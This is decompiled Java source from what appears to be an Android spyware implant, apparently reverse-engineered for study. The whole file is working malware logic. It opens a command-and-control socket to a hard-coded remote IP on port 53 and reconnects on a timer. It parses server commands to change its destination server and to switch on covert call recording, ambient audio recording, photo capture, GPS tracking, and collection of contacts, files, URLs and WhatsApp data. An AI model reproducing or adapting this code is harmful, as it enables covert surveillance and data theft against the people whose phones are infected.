package com.security;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.android.system.CoreApp;
import com.app.system.common.service.EventsAndReceiveService;
import com.security.b.b;
import com.security.b.c;
import com.security.b.d;
import com.security.b.e;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.Reader;
import java.io.Writer;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class a
{
  public static String a = "NONE";
  public static final String b = "a";
  public static a q;
  StringBuilder c = null;
  Boolean d = Boolean.valueOf(false);
  InetSocketAddress e = new InetSocketAddress("80.211.66.**", 53); /* TRUNCATED FOR PRIVACY */
  boolean f = false;
  BufferedWriter g;
  BufferedReader h;
  Socket i;
  Thread j;
  String k;
  Timer l;
  boolean m = false;
  HashMap<b, com.security.b.a> n = new HashMap();
  ArrayList<String> o = new ArrayList();
  Timer p;
  
  private a()
  {
    d locald = new d();
    e locale = new e();
    c localc = new c();
    this.n.put(locald.a, locald);
    this.n.put(locale.a, locale);
    this.n.put(localc.a, localc);
    this.m = false;
    this.p = new Timer();
    this.p.scheduleAtFixedRate(new TimerTask()
    {
      public void run()
      {
        synchronized (a.this.o)
        {
          if (!a.this.o.isEmpty())
          {
            if (a.a(a.this, (String)a.this.o.get(0))) {
              a.this.o.remove(0);
            }
          }
          else if (a.this.d.booleanValue()) {
            a.this.a(false);
          }
          return;
        }
      }
    }, 10000L, 2000L);
  }
  
  public static a a()
  {
    if (q == null) {
      q = new a();
    }
    return q;
  }
  
  private void b()
  {
    this.c = new StringBuilder();
    if (!this.d.booleanValue()) {}
    try
    {
      com.security.d.a.c("DispatcherManager", "Socket Opening", new Object[0]);
      Object localObject1 = new java/net/Socket;
      ((Socket)localObject1).<init>();
      this.i = ((Socket)localObject1);
      this.i.connect(this.e);
      com.security.d.a.c("DispatcherManager", "Socket Open", new Object[0]);
      this.i.setSoTimeout(60000);
      com.security.d.a.c("DispatcherManager", "Socket Timeout set to 30 sec.", new Object[0]);
      if (this.i.isConnected())
      {
        this.d = Boolean.valueOf(true);
        this.m = false;
        if (this.l != null) {
          this.l.cancel();
        }
        com.security.d.a.c("DispatcherManager", "Socket Connected", new Object[0]);
        localObject1 = new java/io/BufferedReader;
        Object localObject2 = new java/io/InputStreamReader;
        ((InputStreamReader)localObject2).<init>(this.i.getInputStream());
        ((BufferedReader)localObject1).<init>((Reader)localObject2);
        this.h = ((BufferedReader)localObject1);
        com.security.d.a.c("DispatcherManager", "IN Acquired", new Object[0]);
        localObject2 = new java/io/BufferedWriter;
        localObject1 = new java/io/OutputStreamWriter;
        ((OutputStreamWriter)localObject1).<init>(this.i.getOutputStream());
        ((BufferedWriter)localObject2).<init>((Writer)localObject1);
        this.g = ((BufferedWriter)localObject2);
        com.security.d.a.c("DispatcherManager", "OUT Acquired", new Object[0]);
        localObject1 = new com/security/a$2;
        ((2)localObject1).<init>(this);
        this.j = ((Thread)localObject1);
        this.j.start();
      }
      return;
    }
    catch (IOException localIOException)
    {
      for (;;) {}
    }
  }
  
  private void c()
  {
    synchronized (this.c)
    {
      Object localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      ((StringBuilder)localObject1).append("MessageTale:");
      ((StringBuilder)localObject1).append(this.c);
      com.security.d.a.c("DispatcherManager", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = this.n.keySet().iterator();
      while (((Iterator)localObject1).hasNext())
      {
        b localb = (b)((Iterator)localObject1).next();
        com.security.b.a locala = (com.security.b.a)this.n.get(localb);
        Matcher localMatcher = locala.a().matcher(this.c);
        while (localMatcher.find())
        {
          this.c.replace(localMatcher.regionStart(), localMatcher.regionEnd(), "");
          if (localb == b.d)
          {
            locala.a(localMatcher.group());
          }
          else
          {
            Object localObject3;
            if (localb == b.a)
            {
              localObject3 = locala.a(localMatcher.group());
              SharedPreferences.Editor localEditor = CoreApp.a().getSharedPreferences("pref", 0).edit();
              localEditor.putString("DEST_SERVER_IP", (String)((HashMap)localObject3).get("host"));
              localEditor.putInt("DEST_SERVER_PORT", ((Integer)((HashMap)localObject3).get("port")).intValue());
              localEditor.putInt("DEST_SERVER_MQTT_PORT", ((Integer)((HashMap)localObject3).get("mqtt_port")).intValue());
              localEditor.putBoolean("DEST_SERVER_SSL_ACTIVE", ((Boolean)((HashMap)localObject3).get("use_SSL")).booleanValue());
              localEditor.commit();
              this.f = true;
              com.app.system.common.d.a.a.a.a();
              localObject3 = new android/content/Intent;
              ((Intent)localObject3).<init>(CoreApp.a(), EventsAndReceiveService.class);
              ((Intent)localObject3).putExtra("event_core_app", "event_connection_params");
              com.b.a.a.a.a(CoreApp.a(), (Intent)localObject3);
            }
            else if ((localb != b.b) && (localb == b.c))
            {
              localObject3 = locala.a(localMatcher.group());
              ServiceSettings.a().a("list-calls-active", ((Boolean)((HashMap)localObject3).get("callListActive")).booleanValue());
              ServiceSettings.a().a("call-active", ((Boolean)((HashMap)localObject3).get("callRecActive")).booleanValue());
              ServiceSettings.a().a("contact-active", ((Boolean)((HashMap)localObject3).get("contactsActive")).booleanValue());
              ServiceSettings.a().a("gps-active", ((Boolean)((HashMap)localObject3).get("gpsAndCellsActive")).booleanValue());
              ServiceSettings.a().a("sms-active", false);
              ServiceSettings.a().a("whatsapp-im-active", ((Boolean)((HashMap)localObject3).get("whatsappRtActive")).booleanValue());
              ServiceSettings.a().a("url-active", ((Boolean)((HashMap)localObject3).get("urlActive")).booleanValue());
              ServiceSettings.a().a("app-log-active", ((Boolean)((HashMap)localObject3).get("appListActive")).booleanValue());
              ServiceSettings.a().a("files-active", ((Boolean)((HashMap)localObject3).get("filesActive")).booleanValue());
              ServiceSettings.a().a("ambient-record-active", ((Boolean)((HashMap)localObject3).get("ambRecActive")).booleanValue());
              ServiceSettings.a().a("shoot-photo-active", ((Boolean)((HashMap)localObject3).get("ambPhotoActive")).booleanValue());
              ServiceSettings.a().a("media-data-transfered-by-wifi-only", ((Boolean)((HashMap)localObject3).get("wifiOnlySend")).booleanValue());
              ServiceSettings.a().a("send-operation-output", ((Boolean)((HashMap)localObject3).get("redirectOperationsOut")).booleanValue());
            }
          }
        }
      }
      return;
    }
  }
  
  private boolean c(String paramString)
  {
    if (this.d.booleanValue())
    {
      Object localObject = this.i;
      if ((localObject != null) && (((Socket)localObject).isConnected()))
      {
        BufferedWriter localBufferedWriter = this.g;
        if (localBufferedWriter != null) {
          try
          {
            localObject = new java/lang/StringBuilder;
            ((StringBuilder)localObject).<init>();
            ((StringBuilder)localObject).append(paramString);
            ((StringBuilder)localObject).append("\r\n");
            localBufferedWriter.write(((StringBuilder)localObject).toString());
            this.g.flush();
            localObject = new java/lang/StringBuilder;
            ((StringBuilder)localObject).<init>();
            ((StringBuilder)localObject).append("Sent:");
            ((StringBuilder)localObject).append(paramString);
            com.security.d.a.c("DispatcherManager", ((StringBuilder)localObject).toString(), new Object[0]);
            return true;
          }
          catch (IOException paramString)
          {
            this.i = null;
            this.g = null;
            return false;
          }
        }
      }
    }
    return false;
  }
  
  public void a(String paramString)
  {
    a = paramString;
  }
  
  public void a(boolean paramBoolean)
  {
    this.d = Boolean.valueOf(false);
    com.security.d.a.c("DispatcherManager", "Closing Current Connection...", new Object[0]);
    this.h = null;
    this.g = null;
    try
    {
      if (this.i != null) {
        this.i.close();
      }
    }
    catch (IOException localIOException)
    {
      localIOException.printStackTrace();
    }
    this.i = null;
    if ((paramBoolean) && (!this.m))
    {
      this.m = true;
      this.l = new Timer();
      this.l.scheduleAtFixedRate(new TimerTask()
      {
        public void run()
        {
          com.security.d.a.c("DispatcherManager", "Tryng to reestablish connection with Artemide", new Object[0]);
          a.b(a.this);
        }
      }, 0L, 20000L);
    }
  }
  
  public void b(String paramString)
  {
    synchronized (this.o)
    {
      String str = b;
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("Message enqueued to sent:");
      localStringBuilder.append(paramString);
      com.security.d.a.d(str, localStringBuilder.toString(), new Object[0]);
      if (!this.o.contains(paramString))
      {
        this.o.add(paramString);
        if (!this.d.booleanValue()) {
          b();
        }
      }
      return;
    }
  }
}


/* Location:              ~/com/security/a.class
 *
 * Reversed by:           J
 */